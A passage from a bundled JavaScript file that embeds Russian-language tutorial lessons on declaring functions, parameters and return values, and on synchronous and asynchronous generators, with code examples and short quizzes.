переменной:\n\n~~~console\nargument\n~~~\n\nто возвращается уже не ~undefined~, а число, и это число мы видим в консоли вместо ~undefined~.\n\nАналогично, когда мы вызываем функцию:\n\n~~~console\nMath.sin(argument)\n~~~\n\nто возвращается значение 1, и мы видим в консоли это значение вместо ~undefined~.\n\nОднако если мы сделаем так:\n\n~~~console\nvar sin = Math.sin(argument)\n~~~\n\nто мы опять увидим в консоли ~undefined~, потому что присваивание не возвращает значения.\n\n______________________________________________\n\nИтак, для вызова функции нужно имя функции, после которого должны быть круглые скобки.\nВ круглых скобках мы можем передать функции **аргументы**, т.е. данные, которые функция будет использовать при вычислении возвращаемого значения.\nОднако функция может не возвращать никакого значения, тогда движок воспринимает это так, как если бы функция вернула ~undefined~.\n\nЛюбая строчка кода, которую мы запускаем в консоли нажатием клавиши _Enter_, воспринимается как вызов **анонимной** функции.\nЕсли эта строчка содержит оператор присваивания, то такая строчка кода не вернет никакого значения, поэтому мы видим в консоли ~undefined~.\nЕсли мы вызываем функцию **~console.log~**, она выводит переданные ей аргументы в консоль, но не возвращает никакого значения, поэтому после вывода в консоль мы опять увидим ~undefined~.\n\nНаконец, давайте посмотрим, что же вернет нам оператор **~typeof~**:\n\n§§§§ Demo | function_console_03_template §§§§\n\n______________________________________________\n\n## ![ico-30 icon] Объявление функции\n\nМы уже научились вызывать функции. Пора нам научиться создавать их, а точнее - объявлять функции.\nИменно объявлять, потому что нашей целью не является немедленный вызов функции в том месте, где мы ее объявили.\n\nДля того, чтобы правильно объявить функцию, нам нужно понять, чем функция отличается от всех остальных типов данных.\n\nВо-первых, функция содержит код, который будет выполнен в момент вызова функции.\nЭтот код помещается в фигурные скобки и называется **телом функции**.\n\n~~~js\n{\n  var number = 5\n  var name = 'Google'\n}\n~~~\n\nЗдесь явно чего-то не хватает, не так ли?\nВо-первых, у функции должно быть имя, чтобы мы могли ее вызвать.\nВо-вторых, мы видим блок кода в фигурных скобках, и если его так и поместить в наш код, то он будет просто выполнен, как и все строчки кода до него и после него.\n\n§§§§ Demo | function_00_template §§§§\n\nНет, нам явно нужно нечто другое.\nНу, например, чтобы код был сохранен под каким-то именем, но не был исполнен в том месте, где появился.\nЧтобы можно было потом, когда понадобится, запустить этот код на исполнение. Не сразу, а когда-то потом.\n\nНо если мы просто запишем:\n\n~~~js\nvar func = {\n  var number = 5\n  var name = 'Google'\n}\n~~~\n\nто движок подумает, что мы хотим создать объект (помните, как мы создавали структуры данных?).\nНо мы не можем использовать ключевое слово **_~var~_** и оператор присваивания внутри фигурных скобок при объявлении объекта, потому что там должны быть перечислены через запятую пары (ключ: значение).\nЧто же ответит нам движок на наш код?\nДвижок сгенерирует исключение **SyntaxError**:\n\n~~~error\n    Uncaught SyntaxError: Unexpected identifier 'number'\n~~~\n\nТак как же нам объяснить движку, что это не объект, а тело функции?\n\nНам для этого нужно ключевое слово **~function~**.\n\nДавайте попробуем исправить ситуацию так:\n\n~~~js\nvar func = function {\n  var number = 5\n  var name = 'Google'\n}\n~~~\n\nи опять движок генерирует исключение **SyntaxError**:\n\n~~~error\n    Uncaught SyntaxError: Unexpected token '{'\n~~~\n\nДвижку явно не нравится фигурная скобка после слова **~function~**...\nХм... Может, там должно быть что-то другое?\n\nИ теперь мы вспоминаем, что вызываем-то мы функцию всегда с помощью круглых скобок, в которых могут быть переданы аргументы.\n\nАга, так и есть, нам нужно вставить круглые скобки между ключевым словом **~function~** и открывающей фигурной скобкой '{':\n\n~~~js\nvar func = function () {\n  var number = 5\n  var name = 'Google'\n}\n~~~\n\nИтак, мы использовали оператор присваивания, в правой части которого мы поместили такое выражение: ключевое слово **~function~**, за которым обязательно следуют круглые скобки, и далее - фигурные скобки для тела функции.\n\nКак мы уже знаем, движок сначала вычислит выражение в правой части оператора присваивания, а затем полученное значение поместит в переменную **~func~**.\nТак вот, после вычисления выражения в правой части оператора присваивания будет создан **объект функции** (в спецификации языка - \"**вызываемый объект**\"), а все объекты, как мы уже знаем, являются **ссылочным типом данных**, т.е. нам будет возвращена **ссылка**, которая и попадет в переменную **~func~**.\n\nИтак, код внутри тела функции не был исполнен.\nПроверим?\n\nОбявим переменные **~number~** и **~name~** до объявления функции.\n\n§§§§ Demo | function_01_template §§§§\n\nКак видите, объявление функции никак не повлияло на значения переменных **~number~** и **~name~**.\nТ.е. код в теле функции не сработал.\nОднако когда мы вывели переменную **~func~** в консоль, мы увидели тело функции. Т.е. код функции где-то сохранен, но пока он не сработал.\n\nИтак, ссылка на функцию у нас есть, осталось вызвать функцию:\n\n~~~js\nfunc()\n~~~\n\n§§§§ Demo | function_02_template §§§§\n\nВот такое присваивание:\n\n~~~js\nvar func = function () {}\n~~~\n\nявляется одним из способов объявления функции, который называется **function expression**.\n\nДействительно, если мы используем оператор присваивания, то в правой части у нас находится **выражение** (expression), отсюда и название **function expression**.\n\nОднако это не единственный способ объявления функции.\n\n_____________________________________________________________________\n\nНа самом деле нам вполне достаточно ключевого слова **_~function~_** вместо ключевого слова **_~var~_**:\n\n~~~js\nfunction func () {}\n~~~\n\nЭто еще один способ объявления функции - **function declaration**.\nГлавное отличие от **function expression** - отсутствие оператора присваивания.\nПозже мы разберем подробнее, на что это влияет и почему.\n\nФактически мы объявили переменную **_~func~_**, сразу же указав ее тип данных при объявлении, т.е. используя **_~function~_** вместо **_~var~_**.\nТот факт, что мы не используем оператор присваивания, не означает, что присваивания не происходит. Присваивание происходит \"под капотом\". Т.е. создается функция и ссылка на нее помещается в переменную **_~func~_**.\n\n_________________________________________________\n\n![ico-25 warn] Круглые скобки после имени переменной означают вызов функции и могут быть использованы только тогда, когда эта переменная является ссылкой на функцию.\nВ противном случае будет сгенерировано исключение **TypeError**:\n\n~~~js\nvar func = 10\nfunc()\n~~~\n\n~~~error\n    Uncaught TypeError: func is not a function\n~~~\n\nДвижок воспринимает вызов функции как выражение, значение которого нужно вычислить, для чего нужно запустить на исполнение код функции.\nЭто означает, что после вычисления выражения ~func()~ в том месте, где оно было встречено, будет некое значение...\nДавайте разберемся, как определяется это значение.\n_________________________________________________\n\n## ![ico-30 icon] Формальные параметры\n\nДавайте вернемся к тому, что при объявлении функции круглые скобки являются обязательными.\nПри вызове функции круглые скобки также являются обязательными.\n\nОчевидно, что круглые скобки играют здесь важную роль.\n\nВспомним, как могут быть использованы круглые скобки при вызове функции: мы передаем функции **аргументы** в момент вызова, т.е. какие-то данные, которые функция использует во время работы.\nОк, а как функция \"принимает\" эти данные?\nИх же нужно куда-то \"положить\".\nА где мы храним данные? Ну, не ящиках, и не в тазиках, и не в кастрюлях.\nМы храним свои данные в **переменных**.\n\nТ.е. чтобы принять переданные при вызове функции аргументы, нужно заранее приготовить переменные, в которые эти данные (аргументы) будут помещены.\nИ как-то само собой напрашивается, что нужно имена этих переменных разместить там, куда потом буду поступать аргументы.\nТ.е. в кргулых скобках.\nЛогично?\n\n§§§§ Demo | function_parameters_template §§§§\n\nТаким образом, при объявлении функции мы используем круглые скобки для того, чтобы перечислить там имена переменных, которые мы будем использовать для вычислений в теле функции.\nЭти переменные называются **формальные параметры** функции.\nНа момент объявления функции у этих переменных нет значений.\nПри вызове функции в круглых скобках будут перечислены **аргументы**, которые и станут значениями формальных параметров на данный момент.\nТ.е. каждый раз при вызове функции мы можем передавать ей различные аргументы, тем самым получая различные результаты.\n\n### ![ico-25 icon] Дефолтные значения\n\nКонечно, большую проблему составляли для нас ошибки, связанные с передачей некорректных значений аргументов.\nВ арифметических операциях в случае ошибки мы будем получать коварное значение **~NaN~**, которое будет доставлять нам много неприятностей.\n\n§§§§ Demo | function_parameters_01_template §§§§\n\nНо в 2015 году вышла новая версия спецификации языка (ES6), в которой у нас появилась возможность задавать дефолтные значения параметров функции при ее объявлении, что позволяет избежать проблем с вызовом функции без параметров или когда эти параметры имеют значения **~undefined~**:\n\n§§§§ Demo | function_parameters_02_template §§§§\n\nБолее того, можно сделать дефолтные значения параметров функции **вычисляемыми**:\n\n§§§§ Demo | function_parameters_03_template §§§§\n\n![ico-25 warn] Обратите внимание, что **значения параметров функции по умолчанию** используются только в том случае, если при вызове функции передано значение **~undefined~** (или вообще не передано никакого значения). Т.е. это не избавляет вас от необходимости проверять другие \"нежелательные\" значения аргументов, такие как **~null~**, **~NaN~** или когда аргумент должен быть числом, а передано не числовое значение.\n\n__________________________________________________________________\n\n## ![ico-30 icon] Оператор return\n\nФункции, которые мы объявляли до сих пор, были как бы \"неполноценные\", потому что они ничего не возвращали, поэтому мы в консоли все время видели это назойливое **~undefined~**.\n\nТеперь, наконец, мы избавимся от этой \"неполноценности\" и заставим наши функции возвращать значение.\nА сделать это очень легко: для это есть унарный оператор **~return~**.\n\n~~~js\nvar calcs = function (x = 1, y = x * 2, z = 0) {\n  return x + y - z\n}\n~~~\n\n![ico-25 warn] Этот оператор может быть использован только в теле функции.\nЕсли вы попытаетесь использовать его вне тела функции, то будет сгенерировано исключение:\n\n~~~error\n    Uncaught SyntaxError: Illegal return statement\n~~~\n\nОператор **~return~** прерывает выполнение функции, и если после оператора **~return~** стоит какое-то выражение, то значение этого выражения будет вычислено и возвращено функцией.\n\nЭто унарный оператор, т.е. у него может быть только один операнд.\nЕсли операнд не указан явно, подразумевается **~undefined~**.\n\n____________________________________________________________________\n\n## ![ico-25 icon] Тесты\n\n◘◘** 1**◘◘\n~~~js\nvar func = function (arg) {\n  return Math.random() * arg\n}\n~~~\n\n→→→ Что это такое? | 'function declaration', 'function expression' | function expression→→→\n\n◘◘** 2**◘◘\n~~~js\nfunction greeting (userName) {\n  return 'Hi ' + userName + '!'\n}\n\nconsole.log(greeting())\n~~~\n\n→→→ Что будет в консоли? | '\"\"', 'Hi user!', 'Hi undefined!', 'Hi !' | Hi undefined!→→→\n\n◘◘** 3**◘◘\n~~~js\nfunction greeting (userName = 'Human') {\n  return 'Hi ' + userName + '!'\n}\n\nconsole.log(greeting())\n~~~\n\n→→→ Что будет в консоли? | '\"\"', 'Hi !', 'Hi undefined!', 'Hi Human!' | Hi Human!→→→\n\n\n◘◘** 4**◘◘\n~~~js\nfunction greeting (userName = 'Human') {\n  return 'Welcome ' + userName + '!'\n  return 'Hi ' + userName + '!'\n}\n\nconsole.log(greeting())\n~~~\n\n→→→ Что будет в консоли? | 'Hi !', 'Welcome !', 'Hi undefined!', 'Welcome undefined!', 'Hi Human!', 'Welcome Human!' | Welcome Human!→→→\n\n◘◘** 5**◘◘\n~~~js\nfunction randomInteger (number = 100) {\n  return Math.round(Math.random() * number)\n}\n~~~\n\n→→→ randomInteger() > 100 | true, false, undefined, 0, NaN | false→→→\n\n◘◘** 6**◘◘\n~~~js\nfunction hexToDecimal (hexNumber = 0) {\n  return parseInt(hexNumber, 16) || 0\n}\n~~~\n\n→→→ !hexToDecimal() | undefined, true, false, 0, NaN | true→→→\n\n◘◘** 7**◘◘\n~~~js\nfunction binToDecimal (bin = '1111111') {\n  return parseInt(bin, 2) || 0\n}\n~~~\n\n→→→ binToDecimal('540') | undefined, true, false, 0, NaN | 0→→→\n\n◘◘** 8**◘◘\n~~~js\nfunction hexToDecimal (hex = 'FF') {\n  return parseInt(hex, 16) || 255\n}\n~~~\n\n→→→ hexToDecimal('rob') | undefined, true, false, 0, NaN, 255 | 255→→→\n____________________________________________________________________\n\n[![ico-25 hw] Quiz](quiz/function)\n\n_______________________________________\n[![ico-20 link] w3schools](external/w3-function)\n[![ico-20 link] MDN](external/mdn-function)\n"},40445:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Генераторы и итераторы\n\n**ES 2015**\n\n_______________________________________________________\n\n## ![ico-25 icon] Передача параметров\n\nУ функции-генератора, как и у любой нормальной функции, могут быть формальные параметры и приватные переменные.\n\nЭта функция имеет внутренний "тормоз" (~yield~) и внешний стартер (метод ~next~ итератора),\nи в точке останова (~yield~) возникает возможность получить извне дополнительные данные.\nПоскольку "пинок" извне, заставляющий генератор возобновить работу с той точки, в которой она была остановлена, - это метод ~next~ итератора,\nто логично, что именно с этим "пинком" можно передать новые данные функции-генератору.\n\nИтак, при вызове метода ~next~ итератора можно передавать некие данные.\nДля того, чтобы эти данные были благополучно "доставлены по назначению",\nв генераторе должно быть присваивание вида:\n\n~~~js\n...\nlet param = yield ...\n...\n~~~\n\nт.е. нужно в месте "стыка" точки возобновления с точкой останова поставить "ловушку" для данных\n(в данном случае это переменная **_param_**).\n\n~yield~ выдает значение наружу, и переводит генератор в режим "ожидания пинка".\n\nЕсли с "пинком" прилетят данные, то они "войдут" в генератор в точке останова,\nт.е. там, где их "поджидает" наш оператор присваивания,\nа именно - в переменную **_param_**...\n\nНапример:\n\n~~~js\nconst iterator = (function * gen (arg) {\n  const x = yield arg\n  const y = yield arg + x\n  const z = yield arg + x + y\n  return arg + x + y + z\n})(1)\n\nconsole.log(iterator.next())\nconsole.log(iterator.next(2))\nconsole.log(iterator.next(3))\nconsole.log(iterator.next(4))\n~~~\n\n~~~console\n► { value: 1, done: false }\n► { value: 3, done: false }\n► { value: 6, done: false }\n► { value: 10, done: true }\n~~~\n\nну, погнали ![ico-20 wink]\n\n_______________________________________________________\n\n◘◘![ico-20 cap] ** 23**◘◘\n\n~~~js\nfunction * testArgGenerator (x) {\n  console.log(\'x: \', x)\n  const y = yield x + 1\n  console.log(\'I remember: x = \', x, \'\\nI receive: y = \', y)\n  const z = yield y * 2\n  console.log(\'I remember: x: \', x, \'y: \', y, \'\\nI receive: z: \', z)\n  return x + y + z\n}\n\nconst testArg = testArgGenerator(10)\n\nfor (const x of [0, 15, 6]) console.warn(\'Emitted value: \', testArg.next(x).value)\n~~~\n\n{{{generators-23.js}}}\n\nВ этом примере генератор объявлен с формальным параметром ** x**.\n\nЗначение, которое будет передано генератору при первом вызове (возвращающем объект итератора),\nиспользуется при вычислении значения, которое вернет первый вызов метода **next** итератора.\n\nОднако при возвращении первого значения в генераторе создается новая приватная переменная ** y**,\nкоторая "подхватывает" эстафету получения аргументов извне.\n\nНа следующей итерации переданное методу **next** значение попадет в приватную переменную ** y**,\nпри этом первое полученное значение сохраняется в приватной переменной ** x**.\n\nДалее "эстафету" принимает переменная ** z**,\nв которую попадет следующее переданное методу **next** значение.\n\nВсе приватные переменные сохраняют свои значения и могут быть использованы в вычислениях.\n\nИтак, на первой итерации используется значение 10, полученное при создании итератора.\nЭто значение сохраняется в приватной переменной ** x**.\n\nДалее происходит следующее:\nИтерация 2: метод **next** итератора получает аргумент 15, и сохраняет его значение в приватной переменной ** y**.\nИтерация 2: метод **next** итератора получает аргумент 6, и сохраняет его значение в приватной переменной ** z**.\n\nКак мы видим, значения переменных ** x**, ** y** и ** z** сохраняются до завершения.\n\nНапример, мы можем стартовать с любой суммы и рассчитать, сколько будет на счету через 3 месяца, если каждый месяц сумма будет увеличиваться на 10%:\n\n________________________________\n\n◘◘![ico-20 cap] ** 24**◘◘\n\n~~~js\nfunction * testArgGenerator (x) {\n  const roundSum = sum => Math.round(sum * 100) / 100\n\n  console.log(\'x: \', x)\n  const y = yield roundSum(x * 1.1)\n  console.log(`Previous state: ${x}\\nCurrent state: ${y}`)\n  const z = yield roundSum(y * 1.1)\n  console.log(`Previous state: ${y}\\nCurrent state: ${z}`)\n  return roundSum(z * 1.1)\n}\n\nconst testArg = testArgGenerator(100)\n\n\nconst total = testArg.next(testArg.next(testArg.next().value).value).value\n\nconsole.log(\'Result: \', total)\n~~~\n\n{{{generators-24.js}}}\n\n_______________________________________________________\n\n## ![ico-25 icon] Аргументы метода next\n\nВычисление факториала\n\n◘◘![ico-20 cap] ** 25**◘◘\n\n~~~js\nfunction* generator (arg) {\n  let result = arg\n  while (true) {\n    result *= yield result\n  }\n}\n\nconst iterator = generator(2)\n\nfor (const x of [2, 3, 4, 5, 6, 7])\n    console.log(iterator.next(x))\n~~~\n\nМожно и так:\n\n~~~js\nfunction* generator () {\n  let result = 2\n  while (true) result *= yield result\n}\n\nconst iterator = generator()\n\nfor (const x of [, 3, 4, 5, 6, 7]) console.log(iterator.next(x).value)\n~~~\n\n_______________________________________________________\n\n◘◘![ico-20 cap] ** 26**◘◘\n\n~~~js\niterator = (function* gen (arg) {\n  let ind = 0, ret = arg, d = new Date().getTime(), key\n\n  while (true) {\n    key = d === new Date().getTime()\n      ? `${d}[${ind++}]`\n      : new Date().getTime()\n    d = new Date().getTime()\n    ret = yield { [key]: ret }\n  }\n})(\'Hello\')\n\n;[\'\', \'Welcome\', \'Who are you?\', \'Bye-bye...\']\n  .forEach(item => console.log(iterator.next(item)))\n~~~\n\n\n\n~~~console\n▼ {value: {…}, done: false}\n    done: false\n  ► value: {1572850855950[0]: "Hello"}\n  ► __proto__: Object\n\n▼ {value: {…}, done: false}\n    done: false\n  ► value: {1572850855951: "Welcome"}\n  ► __proto__: Object\n\n▼ {value: {…}, done: false}\n    done: false\n  ► value: {1572850855951[1]: "Who are you?"}\n  ► __proto__: Object\n\n▼ {value: {…}, done: false}\n    done: false\n  ► value: {1572850855951[2]: "Bye-bye..."}\n  ► __proto__: Object\n~~~\n\n{{{generators-26.js}}}\n\n_________________________________________________________\n\n[![ico-30 hw] Quiz](quiz/gen)\n'},93477:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Генераторы и итераторы\n\n**ES 2015**\n\n_____________________________________________________________________________\n\n## ![ico-25 icon] for await ... of\n\n**2018**\n\nОбычные итерабельные объекты мы итерируем с помощью обычного оператора ~for...of~\nЕсли мы имеем дело с итерабельным объектом промисов, мы можем его итерировать с помощью ~for await ...of~:\n\n◘◘![ico-25 cap] ** 1**◘◘\n~~~js\nasync function sample() {\n  function sigma (resolve, message, index) {\n    let counter = 60 * index\n    requestAnimationFrame(function alpha () {\n      if (counter-- > 0) requestAnimationFrame(alpha)\n      else resolve(message)\n    })\n  }\n\n  const promises = ['first', 'second', 'third']\n    .map((item, index) => new Promise(resolve => sigma(resolve, item, index + 1)))\n\n  for await (const item of promises) console.log(item)\n}\n\nsample()\n~~~\n\nУже знакомый нам пример:\n\n◘◘![ico-25 cap] ** 2**◘◘\n~~~js\nconst promise = val => new Promise(resolve => setTimeout(() => resolve(val), 1000))\n\nconst browsers = {\n  [Symbol.iterator]: function * () {\n    yield promise('Chrome')\n    yield promise('Mozilla')\n    yield promise('Safari')\n    yield promise('IE')\n  }\n}\n\nasync function showBrowsers () {\n  for await (const browser of browsers) console.log(browser)\n}\n\nshowBrowsers()\n~~~\n\nЗдесь мы создаем итерабельный объект **browsers**.\nфункция-генератор ([Symbol.iterator]) с каждым ~yield~ возвращает промис.\nПри итерировании объекта **browsers** нужно дождаться, когда разрезолвится предыдущий промис.\nДля этого нам нужна асинхронная функция, внутри которой мы сможем использовать ~for await...of~.\n\n_____________________________________________________\n\nТеперь рассмотрим пример с генератором случайных чисел\nВоспользуемся сервисом **_https://www.random.org/decimal-fractions/_**\n\nСоздадим асинхронный генератор **randomNum ()**\n\n◘◘![ico-25 cap] ** 3**◘◘\n~~~js\nasync function * randomNum () {\n  const url = 'https://www.random.org/decimal-fractions/?num=1&dec=10&col=1&format=plain&rnd=new'\n\n  while (true) {\n    yield Number(await (await fetch(url)).text())\n  }\n}\n\nasync function sample() {\n  for await (const number of randomNum()) {\n    console.log(number)\n    if (number > 0.95) break\n  }\n}\n\nsample()\n~~~\n\n_____________________________________________________________________________\n\n## ![ico-25 icon] Symbol.asyncIterator\n\n**2018**\n\nДля того, чтобы сделать объект асинхронно итерабельным, нужно использовать **~Symbol.asyncIterator~** вместо **~Symbol.iterator~**\n![ico-20 warn] Однако в обычном смысле этот объект не будет итерабельным\n\nДавайте начнем с того, что объявим функцию promise:\n\n◘◘promise◘◘\n~~~js\nconst promise = val => new Promise(resolve => setTimeout(() => resolve(val), 1000))\n~~~\n\nТеперь создадим асинхронно-итерабельный объект:\n\n◘◘browsers◘◘\n~~~js\nconst browsers = {\n  [Symbol.asyncIterator]: async function * () {\n    yield promise('Chrome')\n    yield promise('Mozilla')\n    yield promise('Safari')\n    yield promise('IE')\n  },\n  async show () {\n    for await (const browser of browsers) console.log(browser)\n  }\n}\n~~~\n\nМы создали ему свойство [Symbol.asyncIterator], которое является асинхронным генератором.\nКаждый ~yield~ этого генератора возвращает промис.\n\nКак видите, мы добавили ему метод **~show~**, с помощью которого можно асинхронно итерировать этот объект:\n\n~~~js\nbrowsers.show()\n~~~\n\nЗначения будут выведены последовательно, с интервалом 1 сек.\n\nАсинхронный генератор, объявленный как асинхронная функция, сам организовывает очередь и резолвит промисы.\n\n^^Движок JavaScript \"под капотом\" ставит в очередь вызовы ~next()~ и передает их асинхронному генератору, когда он будет готов.^^\n^^То есть после вызова метода ~next()~ можно сразу же вызывать следующий ~next()~, не дожидаясь ответа на предыдущий.^^\n\n\nЕсли мы уберем ключевое свово ~async~ в объявлении объекта, то асинхронный генератор будет возвращать промисы, которые нам прийдется резолвить в методе **~show~**:\n\n◘◘browsers◘◘\n~~~js\nconst browsers = {\n  [Symbol.asyncIterator]: function * () {\n    yield promise('Chrome')\n    yield promise('Mozilla')\n    yield promise('Safari')\n    yield promise('IE')\n  },\n  async show () {\n    for await (const browser of browsers) console.log(await browser)\n  }\n}\n~~~\n\nОбратите внимание, что объект **browsers** можно итерировать исключительно циклом ~for await...of~.\nЭтот объект не является итерабельным в обычном смысле (т.е. синхронно),\nт.е. к нему нельзя применять оператор ~spread~, обычный оператор цикла ~for...of~ и т.д.\n\nДобавим объекту **browsers** синхронный генератор:\n\n~~~js\nconst promise = val => new Promise(resolve => setTimeout(() => resolve(val), 1000))\n\nconst browsers = {\n  [Symbol.asyncIterator]: async function * () {\n    yield promise('Chrome')\n    yield promise('FireFox')\n    yield promise('Safari')\n    yield promise('Edge')\n  },\n\n  [Symbol.iterator]: function * () {\n    yield 'Google',\n    yield 'Mozilla',\n    yield 'Apple',\n    yield 'Microsoft'\n  },\n\n  async show () {\n    for await (const browser of browsers) console.log(browser)\n  }\n}\n\nbrowsers.show()\n\nconsole.log(...browsers)\n\nArray.from(browsers).forEach(browser => console.log(browser))\n~~~\n\nОбратите внимание, что вызов асинхронного генератора (метода browsers.show()) стоит раньше, чем обращения к синхронному генератору,\nоднако синхронный код будет выполнен раньше.\n_____________________________________________________________________________\n\n## ![ico-25 icon] Асинхронный генератор\n\nСоздадим генератор, который выдает по одному символу в секунду из массива, переданного ему в качестве аргумента.\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nasync function * messageGenerator (arr) {\n  while (arr.length > 0) {\n    const result = await new Promise(resolve => setTimeout(() => resolve(arr.shift()), 1000))\n    yield result\n  }\n}\n~~~\n\nПоскольку протокол итерирования, заложенный в генераторе, возвращает промис на каждой итерации, для работы с ним объявим асинхронную функцию **showMessage**.\n\n**showMessage** создаст итератор с помощью генератора **messageGenerator**, передав ему строку, которая будет выводиться на страницу по одному символу в секунду.\n\n**showMessage** будет ждать (~await~), когда асинхронный итератор вернет очередное значение, и после этого выведет его на страницу.\n\n~~~js\nasync function showMessage (message) {\n  const iterator = messageGenerator([...message])\n  let finish = false\n\n  while (!finish) {\n    const { value, done } = await iterator.next()\n    document.body.textContent += !done ? value : ''\n    finish = done\n  }\n}\n~~~\n\nВызовем асинхронную функцию **showMessage**:\n\n~~~js\nshowMessage('Привет, студент!')\n~~~\n\n{{{generators-12.js}}}\n\nПримечание:\nГораздо логичнее будет использовать вместо таймера **requestAnimationFrame**:\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nasync function * messageGenerator (arr) {\n  while (arr.length > 0) {\n    let counter = 60\n    const result = await new Promise(resolve => requestAnimationFrame(function sigma () {\n      if (counter-- > 0) requestAnimationFrame(sigma)\n      else {\n        counter = 60\n        resolve(arr.shift())\n      }\n    }))\n\n    yield result\n  }\n}\n~~~\n\nОбъясните, почему ![ico-20 wink]\n\n_______________________________________________________\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\nconst circle = Object.assign(document.createElement('div'), {\n  style: `\n    border: solid 2px blue;\n    width: 50px;\n    height: 50px;\n    position: absolute;\n    border-radius: 50%;\n    transition: all 0.2s;\n    opacity: 1;\n  `\n})\n\ncircle.bubblesGenerator = (async function * () {\n  const bubble = () => new Promise(resolve => setTimeout(() => resolve('next'), 100))\n  while (true) {\n    const radius = this.offsetWidth > 200 ? 50 : this.offsetWidth + 5\n    await bubble()\n    Object.assign(this.style, {\n      width: `${radius}px`,\n      height: `${radius}px`,\n      opacity: radius === 50 ? 1 : Math.max(this.style.opacity - 0.02, 0)\n    })\n\n    yield radius\n  }\n}).call(circle)\n\n\ndocument.body.appendChild(circle)\n\nasync function show () {\n  let step = 200\n  while (step --\x3e 0) await circle.bubblesGenerator.next()\n}\n\nshow()\n~~~\n\n{{{generators-13.js}}}\n\n______________________________________________________\n\n### ![ico-25 cap] Примеры асинхронного генератора\n\n@@@@ 4\n\n[:::7:::](samples/22)\n[:::8:::](samples/23)\n[:::9:::](samples/24)\n[:::10:::](samples/21)\n\n@@@@\n\n\n^^^[Описание примера 10]\n\n^^Создадим слайдер с помощью итератора.^^\n\n^^Для начала определим массив картинок **pictures**^^\n\n~~~js\nconst pictures = [\n  'https://cdn.pixabay.com/photo/2023/10/06/07/14/plant-8297610_1280.jpg',\n  'https://cdn.pixabay.com/photo/2023/10/12/14/41/town-8310950_1280.jpg',\n  'https://cdn.pixabay.com/photo/2017/01/18/16/46/hong-kong-1990268__340.jpg',\n  'https://cdn.pixabay.com/photo/2013/03/02/02/41/city-89197__340.jpg',\n  'https://cdn.pixabay.com/photo/2017/12/10/17/40/prague-3010407__340.jpg',\n  'https://cdn.pixabay.com/photo/2018/01/31/12/16/architecture-3121009__340.jpg',\n  'https://cdn.pixabay.com/photo/2015/02/24/13/23/city-647400__340.jpg',\n  'https://cdn.pixabay.com/photo/2018/11/29/21/19/hamburg-3846525__340.jpg'\n]\n~~~\n\n^^Добавим массиву **pictures** метод **_createSlide_**^^\n\n~~~js\npictures.createSlide = function () {\n  const slide = document.body\n    .appendChild(document.createElement('figure'))\n\n  slide.style = `\n    position: absolute;\n    top: 10%;\n    bottom: 10%;\n    left: 10%;\n    right: 10%;\n    transition: all 0.5s;\n    background-size: contain;\n    background-repeat: no-repeat;\n    background-position: center center;\n  `\n\n  slide.onclick = function () {\n    this.iterator.next()\n  }.bind(this)\n\n  return slide\n}\n~~~\n\n^^Этот метод создает и возвращает html-элемент с заданными стилевыми атрибутами и обработчиком события ~click~.^^\n\n^^Обратите внимание, что обработчик события ~click~ вызывает метод **_~next()~_** итератора.^^\n\n^^Определим этот итератор.^^\n\n^^Для этого нужно объявить и вызвать функцию-генератор.^^\n\n^^Мы объединим два этих действия в одно с помощью **IIFE**.^^\n\n~~~js\npictures.iterator = (function * () { ... }).call(pictures)\n~~~\n\n^^Обратите внимание, что мы вызываем анонимную функцию-генератор в контексте объекта **pictures**.^^\n\n^^Теперь ~this~ внутри генератора будет показывать в правильном направлении ![ico-20 ok].^^\n\n^^Внутри анонимной функции-генератора:^^\n\n_________________________\n\n^^![ico-20 pin] объявим вспомогательную функцию **_moveSlide_**, которая будет сдвигать слайд в нужном направлении в зависимости от значения второго аргумента **active**.^^\n\n^^Этот аргумент принимает логическое значение.^^\n\n^^Если ~true~, то слайд сдвигается в видимую часть страницы, т.е. становится активным.^^\n\n^^В противном случае слайд \"уходит\" из видимой зоны.^^\n\n^^Первым аргументом передается ссылка на сдвигаемый слайд.^^\n\n~~~js\nfunction moveSlide (slide, active) {\n  slide.style.left = `${ active ? 10 : -100 }%`\n  slide.style.right = `${ active ? 10 : 100 }%`\n  slide.style.opacity = active ? 1 : 0\n}\n~~~\n\n__________________________\n\n^^![ico-20 pin] Создадим приватный метод **_getNextPictureNum_**, который будет возвращать индекс следующего элемента массива **pictures**.^^\n\n^^Обратите внимание, что этой функции мы заранее \"закрепляем\" контекст вызова с помощью метода ~bind()~, поскольку в противном случае это будет глобальный контекст.^^\n\n~~~js\nconst getNextPictureNum = function () {\n  return this.currentPicture < this.length - 1 ? this.currentPicture + 1 : 0\n}.bind(this)\n~~~\n\n____________________________\n\n^^![ico-20 pin] Теперь создадим массив их двух слайдов:^^\n\n~~~js\nconst slides = [\n  this.createSlide(),\n  this.createSlide()\n]\n~~~\n\n^^Для этого, как видите, мы воспользовались публичным методом **_createSlide_** массива **pictures**.^^\n\n___________________________________\n\n^^![ico-20 pin] Объявим еще пару переменных:^^\n\n^^• приватное свойство **_currentSlide_** будет индексом активного слайда.^^\n^^• публичное свойство **_currentPicture_** будет содержать индекс текущего элемента массива **pictures**.^^\n\n~~~js\nlet currentSlide = 0\nthis.currentPicture = 0\n~~~\n\n_________________________________\n\n^^![ico-20 pin] Осталось совсем немного - написать сам протокол итерирования.^^\n\n^^В процессе итерирования слайды ~slides[0]~ и ~slides[1]~ будут постоянно меняться местами^^\n^^т.е. активным текущим слайдом по очереди будет то ~slides[0]~, то ~slides[1]~.^^\n^^вычислять индекс неактивного слайда для смены слайдов мы будем так:^^\n\n~~~js\nMath.abs(currentSlide - 1)\n~~~\n\nИтак, протокол итерирования:\n\n~~~js\nwhile (true) {\n  this.nextPicture = getNextPictureNum()\n  slides[Math.abs(currentSlide - 1)].style.backgroundImage = `url(${this[this.nextPicture]})`\n  moveSlide(slides[currentSlide], false)\n  await waitFor(500)\n  moveSlide(slides[Math.abs(currentSlide - 1)], true)\n  await waitFor(500)\n  this.currentPicture = this.nextPicture\n  this.nextPicture = getNextPictureNum()\n  currentSlide = Math.abs(currentSlide - 1)\n\n  yield slides[currentSlide]\n\n}\n~~~\n\n^^^\n\n**Полный код слайдера**\n\n~~~~js\nconst pictures = [\n  